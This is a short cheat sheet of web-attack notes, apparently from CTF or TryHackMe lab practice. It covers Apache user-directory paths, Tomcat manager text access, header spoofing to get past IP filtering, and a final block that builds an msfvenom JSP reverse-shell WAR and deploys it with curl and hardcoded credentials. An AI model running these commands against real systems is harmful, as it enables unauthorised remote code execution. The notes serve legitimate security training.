# Web
ALWAYS LOOK FOR AN `API`, after finding an api use `curl -vv` to look closely at the headers

Apache has a setting where it includes home directories in it’s file system, accessible through ~/\[Name of User\].

`http://<IP>/~files/pass.txt`

If apache tomcat creds are found but `/manager` access is disabled(only available for localhost on victim), you can try to look for cli access available at `/manager/text` 

If the webserver is filtering based on your ip, we can use the `X-Forwarded-For: <ip>` or `x-9ad42dea0356cb04: <ip>` headers with a custom ip.

To manually use the start button, use: [https://stackoverflow.com/questions/13831601/disabling-and-enabling-a-html-input-button](https://stackoverflow.com/questions/13831601/disabling-and-enabling-a-html-input-button) 

`whatweb` is able identify the exact version:

```text-plain
whatweb http://maintest.enterprize.thm --plugins typo3 --aggression 3
```

`generate a war shell and upload (upload files with curl):`

```text-plain
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.17.17.11 LPORT=1234 -f war -o revshell.war

curl -u 'webdev:Hgj3LA$02D$Fa@21' --upload-file rshell.war http://10.10.144.71:8080/manager/text/deploy?path=/revshell
```